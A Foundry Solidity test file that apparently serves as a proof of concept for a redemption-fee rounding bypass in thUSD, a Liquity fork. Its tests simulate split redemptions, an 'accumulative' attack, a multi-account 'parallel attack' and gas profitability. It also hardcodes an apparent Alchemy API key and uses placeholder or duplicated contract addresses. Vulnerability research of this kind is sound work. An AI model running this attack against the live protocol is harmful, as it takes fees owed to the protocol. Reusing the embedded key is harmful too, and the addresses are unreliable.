// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title Redemption Fee Rounding Bypass - Scaling Tests
 * @notice Exploit primitive: A permissionless redeemer can reduce effective redemption fee
 *         by splitting thUSD redemption into multiple smaller redeemCollateral() calls
 * @dev Target: thUSD dual-set Liquity fork (ETH + tBTC collateral)
 *      Capability: User receives more collateral for same thUSD burned; PCV receives less fee
 */

// ============ INTERFACES ============

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IChainlinkAggregator {
    function latestRoundData() external view returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    );
    function decimals() external view returns (uint8);
}

interface ITroveManager {
    // Core redemption function
    function redeemCollateral(
        uint256 _thUSDamount,
        address _firstRedemptionHint,
        address _upperPartialRedemptionHint,
        address _lowerPartialRedemptionHint,
        uint256 _partialRedemptionHintNICR,
        uint256 _maxIterations,
        uint256 _maxFeePercentage
    ) external;

    // View functions
    function getRedemptionRate() external view returns (uint256);
    function getRedemptionRateWithDecay() external view returns (uint256);
    function getRedemptionFeeWithDecay(uint256 _collateralDrawn) external view returns (uint256);
    function baseRate() external view returns (uint256);
    function lastFeeOperationTime() external view returns (uint256);
    function getTCR(uint256 _price) external view returns (uint256);
    function getCurrentICR(address _borrower, uint256 _price) external view returns (uint256);
    function getTroveOwnersCount() external view returns (uint256);
    function getTroveFromTroveOwnersArray(uint256 _index) external view returns (address);
    function Troves(address) external view returns (
        uint256 debt,
        uint256 coll,
        uint256 stake,
        uint8 status,
        uint128 arrayIndex
    );
    function getTroveDebt(address _borrower) external view returns (uint256);
    function getTroveColl(address _borrower) external view returns (uint256);
    function priceFeed() external view returns (address);
    function thusdToken() external view returns (address);
    function pcv() external view returns (address);
    function sortedTroves() external view returns (address);
}

interface ISortedTroves {
    function getFirst() external view returns (address);
    function getLast() external view returns (address);
    function getNext(address _id) external view returns (address);
    function getPrev(address _id) external view returns (address);
    function contains(address _id) external view returns (bool);
    function getSize() external view returns (uint256);
    function findInsertPosition(uint256 _NICR, address _prevId, address _nextId) external view returns (address, address);
}

interface IBorrowerOperations {
    function openTrove(
        uint256 _maxFeePercentage,
        uint256 _thUSDAmount,
        address _upperHint,
        address _lowerHint
    ) external payable;

    function openTroveWithCollateral(
        uint256 _collateralAmount,
        uint256 _maxFeePercentage,
        uint256 _thUSDAmount,
        address _upperHint,
        address _lowerHint
    ) external;

    function closeTrove() external;

    function adjustTrove(
        uint256 _maxFeePercentage,
        uint256 _collWithdrawal,
        uint256 _thUSDChange,
        bool _isDebtIncrease,
        address _upperHint,
        address _lowerHint
    ) external payable;

    function minNetDebt() external view returns (uint256);
    function THUSD_GAS_COMPENSATION() external view returns (uint256);
    function MCR() external view returns (uint256);
    function troveManager() external view returns (address);
}

interface IPriceFeed {
    function fetchPrice() external returns (uint256);
    function lastGoodPrice() external view returns (uint256);
}

interface IPCV {
    function thusdToken() external view returns (address);
    function totalTHUSDDeposits() external view returns (uint256);
}

// ============ MAIN TEST CONTRACT ============

contract RedemptionRoundingFalsifiersTest is Test {
    // ============ CONSTANTS ============

    // thUSD Protocol Addresses (Mainnet) - Liquity Fork
    // These are example addresses - adjust to actual deployed contracts
    address constant TROVE_MANAGER_ETH = 0x7144e6be3A4b45Bf12d0c7dC1b2aF10bD3D18fF9;
    address constant TROVE_MANAGER_TBTC = 0x03DeB2f9F77A6F12E0B6fDab10C8B2Db7F3DbaFD;
    address constant BORROWER_OPERATIONS_ETH = 0x7144e6be3A4b45Bf12d0c7dC1b2aF10bD3D18fF9; // Adjust
    address constant BORROWER_OPERATIONS_TBTC = 0x03DeB2f9F77A6F12E0B6fDab10C8B2Db7F3DbaFD; // Adjust
    address constant THUSD_TOKEN = 0xCFC5bD99915aAa815401C5a41A927aB7a38d29cf;
    address constant PCV_ETH = 0x4C417C3D6B687f3D4d0B3E1B3bF8F3A9a7C8F9D0; // Adjust
    address constant PCV_TBTC = 0x5D517D4D6B687f3D4d0B3E1B3bF8F3A9a7C8F9D1; // Adjust
    address constant SORTED_TROVES_ETH = 0x7144e6be3A4b45Bf12d0c7dC1b2aF10bD3D18fF9; // Adjust
    address constant TBTC_TOKEN = 0x18084fbA666a33d37592fA2633fD49a74DD93a88;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // Chainlink oracles
    address constant ETH_USD_ORACLE = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address constant BTC_USD_ORACLE = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c;

    // Test parameters
    uint256 constant MAX_FEE_PERCENTAGE = 1e18; // 100% - no slippage protection for testing
    uint256 constant PRECISION = 1e18;
    uint256 constant MIN_NET_DEBT = 2000e18; // Typical Liquity min
    uint256 constant GAS_COMPENSATION = 200e18; // Typical Liquity

    // RPC URL from environment
    string RPC_URL;
    uint256 FORK_BLOCK;

    // Contract instances
    ITroveManager troveManagerETH;
    ITroveManager troveManagerTBTC;
    IERC20 thusd;
    IERC20 tbtc;

    // ============ SETUP ============

    function setUp() public {
        // Get RPC URL from environment or use default
        RPC_URL = vm.envOr("RPC_URL", string("https://eth-mainnet.g.alchemy.com/v2/ltD0ewEiByO5-I6-cyaeA"));
        FORK_BLOCK = vm.envOr("DEV_FORK_BLOCK", uint256(0));

        if (FORK_BLOCK > 0) {
            vm.createSelectFork(RPC_URL, FORK_BLOCK);
        } else {
            vm.createSelectFork(RPC_URL);
        }

        console.log("=== REDEMPTION ROUNDING FALSIFIERS ===");
        console.log("Fork block:", block.number);
        console.log("Timestamp:", block.timestamp);

        // Initialize contracts
        thusd = IERC20(THUSD_TOKEN);
        tbtc = IERC20(TBTC_TOKEN);
    }

    // ============ HELPER FUNCTIONS ============

    /**
     * @notice Calculate expected redemption fee for a given collateral amount
     * @param collateralDrawn Amount of collateral being redeemed
     * @param redemptionRate Current redemption rate (from baseRate + decay)
     */
    function calculateRedemptionFee(
        uint256 collateralDrawn,
        uint256 redemptionRate
    ) internal pure returns (uint256) {
        // Fee = collateralDrawn * redemptionRate / PRECISION
        // Integer division truncates, causing rounding loss
        return (collateralDrawn * redemptionRate) / PRECISION;
    }

    /**
     * @notice Simulate split redemption rounding loss
     * @param totalAmount Total thUSD to redeem
     * @param splitCount Number of splits
     * @param redemptionRate Current redemption rate
     * @param collateralPrice Price of collateral in USD (18 decimals)
     */
    function simulateSplitRounding(
        uint256 totalAmount,
        uint256 splitCount,
        uint256 redemptionRate,
        uint256 collateralPrice
    ) internal pure returns (
        uint256 singleFee,
        uint256 totalSplitFee,
        uint256 feeDelta,
        uint256 collateralDelta
    ) {
        // Calculate collateral for total amount: collateral = thUSD * 1e18 / price
        uint256 totalCollateral = (totalAmount * PRECISION) / collateralPrice;

        // Single redemption fee
        singleFee = calculateRedemptionFee(totalCollateral, redemptionRate);

        // Split redemption: each call processes totalAmount/splitCount
        uint256 amountPerSplit = totalAmount / splitCount;
        uint256 collateralPerSplit = (amountPerSplit * PRECISION) / collateralPrice;

        totalSplitFee = 0;
        for (uint256 i = 0; i < splitCount; i++) {
            uint256 feePerSplit = calculateRedemptionFee(collateralPerSplit, redemptionRate);
            totalSplitFee += feePerSplit;
        }

        // Delta: positive means redeemer gains (PCV loses)
        if (singleFee > totalSplitFee) {
            feeDelta = singleFee - totalSplitFee;
        } else {
            feeDelta = 0;
        }

        // Collateral delta is equivalent to fee delta (what redeemer keeps instead of paying)
        collateralDelta = feeDelta;
    }

    // ============ CORE TESTS ============

    /**
     * @notice Test: Verify rounding loss exists in fee calculation
     * @dev Capability: User can reduce effective fee by splitting redemptions
     */
    function testRoundingLossExists() public view {
        console.log("\n=== TEST: ROUNDING LOSS EXISTS ===");

        // Use realistic ETH price (~$3000)
        uint256 ethPrice = 3000e18;

        // Test with 0.5% redemption rate (typical Liquity)
        uint256 redemptionRate = 5e15; // 0.5%

        // Test amounts
        uint256[] memory testAmounts = new uint256[](4);
        testAmounts[0] = 100e18;    // 100 thUSD
        testAmounts[1] = 1000e18;   // 1,000 thUSD
        testAmounts[2] = 10000e18;  // 10,000 thUSD
        testAmounts[3] = 100000e18; // 100,000 thUSD

        uint256[] memory splitCounts = new uint256[](5);
        splitCounts[0] = 10;
        splitCounts[1] = 25;
        splitCounts[2] = 50;
        splitCounts[3] = 100;
        splitCounts[4] = 200;

        for (uint256 i = 0; i < testAmounts.length; i++) {
            uint256 amount = testAmounts[i];
            console.log("\n--- thUSD Amount:", amount / 1e18);

            for (uint256 j = 0; j < splitCounts.length; j++) {
                uint256 splits = splitCounts[j];

                (
                    uint256 singleFee,
                    uint256 totalSplitFee,
                    uint256 feeDelta,

                ) = simulateSplitRounding(amount, splits, redemptionRate, ethPrice);

                if (feeDelta > 0) {
                    console.log("  Splits:", splits);
                    console.log("    Single fee (wei):", singleFee);
                    console.log("    Split fee (wei):", totalSplitFee);
                    console.log("    Delta (wei):", feeDelta);
                    console.log("    Delta (ETH):", feeDelta * 1e6 / 1e18); // Scale for readability
                }
            }
        }
    }

    /**
     * @notice Fuzz test: Find optimal split count for maximum delta
     * @dev Explores the relationship between split count and fee savings
     */
    function testFuzz_OptimalSplitCount(
        uint256 amount,
        uint256 splitCount,
        uint256 redemptionRate
    ) public pure {
        // Bound inputs to realistic ranges
        amount = bound(amount, 100e18, 1000000e18); // 100 to 1M thUSD
        splitCount = bound(splitCount, 2, 500);
        redemptionRate = bound(redemptionRate, 1e15, 50e15); // 0.1% to 5%

        uint256 ethPrice = 3000e18;

        (
            uint256 singleFee,
            uint256 totalSplitFee,
            uint256 feeDelta,

        ) = simulateSplitRounding(amount, splitCount, redemptionRate, ethPrice);

        // Assert: split fee should never exceed single fee (no negative delta)
        assert(totalSplitFee <= singleFee);

        // Log significant deltas
        if (feeDelta > 1e12) { // > 0.000001 ETH
            // Significant delta found - this is the exploit
        }
    }

    /**
     * @notice Test: Maximum delta scaling with capital efficiency
     * @dev Goal: Maximize delta while minimizing required capital
     */
    function testMaxDeltaScaling() public view {
        console.log("\n=== TEST: MAX DELTA SCALING ===");

        uint256 ethPrice = 3000e18;
        uint256 redemptionRate = 5e15; // 0.5%

        // Strategy: Find the optimal amount/split ratio
        // Smaller amounts with more splits = higher gas cost per delta
        // Larger amounts with fewer splits = lower gas efficiency

        console.log("Analyzing capital efficiency (delta per thUSD spent)...\n");

        // Test matrix: amount vs splits
        uint256[5] memory amounts = [uint256(1000e18), 5000e18, 10000e18, 50000e18, 100000e18];
        uint256[5] memory splits = [uint256(10), 25, 50, 100, 200];

        uint256 maxDelta = 0;
        uint256 optimalAmount = 0;
        uint256 optimalSplits = 0;
        uint256 maxEfficiency = 0;

        for (uint256 i = 0; i < 5; i++) {
            for (uint256 j = 0; j < 5; j++) {
                (
                    ,
                    ,
                    uint256 feeDelta,

                ) = simulateSplitRounding(amounts[i], splits[j], redemptionRate, ethPrice);

                // Calculate efficiency: delta per 1000 thUSD
                uint256 efficiency = (feeDelta * 1000e18) / amounts[i];

                if (feeDelta > maxDelta) {
                    maxDelta = feeDelta;
                    optimalAmount = amounts[i];
                    optimalSplits = splits[j];
                }

                if (efficiency > maxEfficiency) {
                    maxEfficiency = efficiency;
                }
            }
        }

        console.log("Optimal configuration:");
        console.log("  Amount (thUSD):", optimalAmount / 1e18);
        console.log("  Splits:", optimalSplits);
        console.log("  Max delta (wei):", maxDelta);
        console.log("  Max efficiency (wei per 1000 thUSD):", maxEfficiency);
    }

    /**
     * @notice Test: Accumulative attack simulation
     * @dev Repeated redemptions to accumulate rounding gains
     */
    function testAccumulativeAttack() public view {
        console.log("\n=== TEST: ACCUMULATIVE ATTACK ===");

        uint256 ethPrice = 3000e18;
        uint256 redemptionRate = 5e15;

        // Simulate 100 rounds of optimal redemption
        uint256 amountPerRound = 10000e18; // 10k thUSD per round
        uint256 splitsPerRound = 50;
        uint256 rounds = 100;

        uint256 totalDelta = 0;

        for (uint256 r = 0; r < rounds; r++) {
            (
                ,
                ,
                uint256 feeDelta,

            ) = simulateSplitRounding(amountPerRound, splitsPerRound, redemptionRate, ethPrice);
            totalDelta += feeDelta;
        }

        console.log("Accumulative attack results:");
        console.log("  Rounds:", rounds);
        console.log("  thUSD per round:", amountPerRound / 1e18);
        console.log("  Total thUSD redeemed:", (amountPerRound * rounds) / 1e18);
        console.log("  Total delta accumulated (wei):", totalDelta);
        console.log("  Total delta (ETH):", totalDelta / 1e18);
        console.log("  Average delta per round (wei):", totalDelta / rounds);
    }

    /**
     * @notice Test: Parallel attack (multiple accounts)
     * @dev Multiple accounts executing simultaneously for MEV resistance
     */
    function testParallelAttack() public view {
        console.log("\n=== TEST: PARALLEL ATTACK ===");

        uint256 ethPrice = 3000e18;
        uint256 redemptionRate = 5e15;

        // Simulate 10 accounts executing in parallel
        uint256 accounts = 10;
        uint256 amountPerAccount = 50000e18; // 50k thUSD each
        uint256 splitsPerAccount = 100;

        uint256 totalDelta = 0;

        for (uint256 a = 0; a < accounts; a++) {
            (
                ,
                ,
                uint256 feeDelta,

            ) = simulateSplitRounding(amountPerAccount, splitsPerAccount, redemptionRate, ethPrice);
            totalDelta += feeDelta;
        }

        console.log("Parallel attack results:");
        console.log("  Accounts:", accounts);
        console.log("  thUSD per account:", amountPerAccount / 1e18);
        console.log("  Total thUSD:", (amountPerAccount * accounts) / 1e18);
        console.log("  Total delta (wei):", totalDelta);
        console.log("  Delta per account (wei):", totalDelta / accounts);
    }

    /**
     * @notice Test: Gas cost analysis for profitability
     * @dev Calculate net profit after gas costs
     */
    function testGasCostAnalysis() public view {
        console.log("\n=== TEST: GAS COST ANALYSIS ===");

        uint256 ethPrice = 3000e18;
        uint256 redemptionRate = 5e15;

        // Estimate gas costs
        uint256 gasPerRedemption = 300000; // Typical Liquity redemption
        uint256 gasPriceGwei = 30; // 30 gwei
        uint256 gasCostPerRedemption = gasPerRedemption * gasPriceGwei * 1e9;

        console.log("Gas assumptions:");
        console.log("  Gas per redemption:", gasPerRedemption);
        console.log("  Gas price (gwei):", gasPriceGwei);
        console.log("  Cost per redemption (wei):", gasCostPerRedemption);

        // Find break-even point
        uint256[] memory amounts = new uint256[](5);
        amounts[0] = 10000e18;
        amounts[1] = 50000e18;
        amounts[2] = 100000e18;
        amounts[3] = 500000e18;
        amounts[4] = 1000000e18;

        console.log("\nProfitability analysis:");

        for (uint256 i = 0; i < amounts.length; i++) {
            uint256 amount = amounts[i];
            uint256 splits = 50;

            (
                ,
                ,
                uint256 feeDelta,

            ) = simulateSplitRounding(amount, splits, redemptionRate, ethPrice);

            uint256 totalGasCost = gasCostPerRedemption * splits;

            bool profitable = feeDelta > totalGasCost;
            int256 netProfit = int256(feeDelta) - int256(totalGasCost);

            console.log("\n  Amount (thUSD):", amount / 1e18);
            console.log("    Fee delta (wei):", feeDelta);
            console.log("    Gas cost (wei):", totalGasCost);
            console.log("    Profitable:", profitable);
            if (netProfit >= 0) {
                console.log("    Net profit (wei):", uint256(netProfit));
            } else {
                console.log("    Net loss (wei):", uint256(-netProfit));
            }
        }
    }

    // ============ ADVANCED SCALING TESTS ============

    /**
     * @notice Test: Varying redemption rates impact
     * @dev Higher base rates = higher absolute delta potential
     */
    function testRedemptionRateImpact() public view {
        console.log("\n=== TEST: REDEMPTION RATE IMPACT ===");

        uint256 ethPrice = 3000e18;
        uint256 amount = 100000e18;
        uint256 splits = 100;

        uint256[] memory rates = new uint256[](5);
        rates[0] = 1e15;  // 0.1%
        rates[1] = 5e15;  // 0.5%
        rates[2] = 10e15; // 1.0%
        rates[3] = 25e15; // 2.5%
        rates[4] = 50e15; // 5.0%

        console.log("Amount: 100,000 thUSD, Splits: 100\n");

        for (uint256 i = 0; i < rates.length; i++) {
            (
                uint256 singleFee,
                uint256 totalSplitFee,
                uint256 feeDelta,

            ) = simulateSplitRounding(amount, splits, rates[i], ethPrice);

            console.log("Rate:", rates[i] * 100 / 1e18, "% / 100");
            console.log("  Single fee (wei):", singleFee);
            console.log("  Split fee (wei):", totalSplitFee);
            console.log("  Delta (wei):", feeDelta);
            console.log("");
        }
    }

    /**
     * @notice Test: Price impact on delta
     * @dev Lower collateral prices = larger collateral amounts = more rounding
     */
    function testPriceImpact() public view {
        console.log("\n=== TEST: PRICE IMPACT ON DELTA ===");

        uint256 amount = 100000e18;
        uint256 splits = 100;
        uint256 redemptionRate = 5e15;

        uint256[] memory prices = new uint256[](4);
        prices[0] = 1500e18;  // $1,500 ETH
        prices[1] = 3000e18;  // $3,000 ETH
        prices[2] = 4500e18;  // $4,500 ETH
        prices[3] = 6000e18;  // $6,000 ETH

        console.log("Amount: 100,000 thUSD, Splits: 100, Rate: 0.5%\n");

        for (uint256 i = 0; i < prices.length; i++) {
            (
                uint256 singleFee,
                ,
                uint256 feeDelta,

            ) = simulateSplitRounding(amount, splits, redemptionRate, prices[i]);

            uint256 collateral = (amount * PRECISION) / prices[i];

            console.log("Price: $", prices[i] / 1e18);
            console.log("  Collateral (wei):", collateral);
            console.log("  Single fee (wei):", singleFee);
            console.log("  Delta (wei):", feeDelta);
            console.log("");
        }
    }

    /**
     * @notice Test: Batch transaction optimization
     * @dev Using multicall or batch transactions to reduce gas overhead
     */
    function testBatchOptimization() public view {
        console.log("\n=== TEST: BATCH OPTIMIZATION ===");

        uint256 ethPrice = 3000e18;
        uint256 redemptionRate = 5e15;
        uint256 amount = 100000e18;

        // Compare different batch sizes
        // Smaller batches = more rounding gain but higher gas per unit
        // Larger batches = less rounding gain but lower gas per unit

        uint256[] memory batchSizes = new uint256[](5);
        batchSizes[0] = 10;
        batchSizes[1] = 20;
        batchSizes[2] = 50;
        batchSizes[3] = 100;
        batchSizes[4] = 200;

        // Assume batch call saves 50% gas vs individual calls
        uint256 gasPerIndividualCall = 300000;
        uint256 gasPerBatchedCall = 150000;
        uint256 batchOverhead = 50000;
        uint256 gasPriceGwei = 30;

        console.log("Comparing batch strategies for 100k thUSD:\n");

        for (uint256 i = 0; i < batchSizes.length; i++) {
            uint256 splits = batchSizes[i];

            (
                ,
                ,
                uint256 feeDelta,

            ) = simulateSplitRounding(amount, splits, redemptionRate, ethPrice);

            // Gas cost: overhead + (gasPerBatchedCall * splits)
            uint256 totalGas = batchOverhead + (gasPerBatchedCall * splits);
            uint256 gasCost = totalGas * gasPriceGwei * 1e9;

            int256 netProfit = int256(feeDelta) - int256(gasCost);

            console.log("Batch size:", splits);
            console.log("  Fee delta (wei):", feeDelta);
            console.log("  Gas cost (wei):", gasCost);
            if (netProfit >= 0) {
                console.log("  Net profit (wei):", uint256(netProfit));
            } else {
                console.log("  Net loss (wei):", uint256(-netProfit));
            }
            console.log("");
        }
    }

    // ============ LIVE FORK TESTS ============

    /**
     * @notice Test: Query actual protocol state
     * @dev Reads live state from forked mainnet
     */
    function testLiveProtocolState() public {
        console.log("\n=== TEST: LIVE PROTOCOL STATE ===");

        // Check if thUSD exists at expected address
        uint256 thusdSupply = thusd.totalSupply();
        console.log("thUSD total supply:", thusdSupply / 1e18);

        // Check tBTC
        uint256 tbtcSupply = tbtc.totalSupply();
        console.log("tBTC total supply:", tbtcSupply / 1e8); // tBTC has 8 decimals

        // Query oracle prices
        IChainlinkAggregator ethOracle = IChainlinkAggregator(ETH_USD_ORACLE);
        IChainlinkAggregator btcOracle = IChainlinkAggregator(BTC_USD_ORACLE);

        (, int256 ethPrice,,,) = ethOracle.latestRoundData();
        (, int256 btcPrice,,,) = btcOracle.latestRoundData();

        console.log("ETH/USD price:", uint256(ethPrice) / 1e8);
        console.log("BTC/USD price:", uint256(btcPrice) / 1e8);
    }

    /**
     * @notice Test: Attempt live redemption comparison
     * @dev Requires actual thUSD balance - will be skipped if no balance
     */
    function testLiveRedemptionComparison() public {
        console.log("\n=== TEST: LIVE REDEMPTION COMPARISON ===");

        // This test requires actual thUSD - skip if not available
        address testAccount = makeAddr("redeemer");
        uint256 thusdBalance = thusd.balanceOf(testAccount);

        if (thusdBalance < 100e18) {
            console.log("Skipping: Insufficient thUSD balance for live test");
            console.log("Need to source thUSD via trove opening first");
            return;
        }

        // Would perform actual redemption here
        // Left as placeholder for when thUSD is sourced
    }

    // ============ SUMMARY TEST ============

    /**
     * @notice Run all analysis and produce summary
     */
    function testComprehensiveSummary() public view {
        console.log("\n");
        console.log("========================================");
        console.log("  REDEMPTION ROUNDING EXPLOIT SUMMARY   ");
        console.log("========================================\n");

        uint256 ethPrice = 3000e18;
        uint256 redemptionRate = 5e15;

        // Optimal configuration analysis
        uint256 optimalAmount = 100000e18;
        uint256 optimalSplits = 100;

        (
            uint256 singleFee,
            uint256 totalSplitFee,
            uint256 feeDelta,

        ) = simulateSplitRounding(optimalAmount, optimalSplits, redemptionRate, ethPrice);

        console.log("CAPABILITY:");
        console.log("  Permissionless redeemer can reduce effective fee");
        console.log("  by splitting redemptions into smaller calls\n");

        console.log("OPTIMAL CONFIGURATION:");
        console.log("  Amount: 100,000 thUSD");
        console.log("  Splits: 100 calls");
        console.log("  Single fee:", singleFee, "wei");
        console.log("  Split fee:", totalSplitFee, "wei");
        console.log("  Delta:", feeDelta, "wei\n");

        // Scaling potential
        uint256 dailyVolume = 1000000e18; // 1M thUSD/day assumption
        uint256 roundsPerDay = dailyVolume / optimalAmount;
        uint256 dailyDelta = feeDelta * roundsPerDay;

        console.log("SCALING POTENTIAL (assuming 1M thUSD/day volume):");
        console.log("  Rounds per day:", roundsPerDay);
        console.log("  Daily delta:", dailyDelta, "wei");
        console.log("  Daily delta:", dailyDelta / 1e18, "ETH\n");

        // Gas cost analysis
        uint256 gasPerCall = 150000; // Optimistic with batching
        uint256 gasPriceGwei = 30;
        uint256 gasCostPerRound = gasPerCall * optimalSplits * gasPriceGwei * 1e9;

        int256 netProfitPerRound = int256(feeDelta) - int256(gasCostPerRound);

        console.log("PROFITABILITY (at 30 gwei):");
        console.log("  Gas cost per round:", gasCostPerRound, "wei");
        if (netProfitPerRound >= 0) {
            console.log("  Net profit per round:", uint256(netProfitPerRound), "wei");
            console.log("  EXPLOIT IS PROFITABLE");
        } else {
            console.log("  Net loss per round:", uint256(-netProfitPerRound), "wei");
            console.log("  Exploit not profitable at current gas prices");
            console.log("  Break-even gas price:", feeDelta / (gasPerCall * optimalSplits) / 1e9, "gwei");
        }

        console.log("\n========================================\n");
    }
}
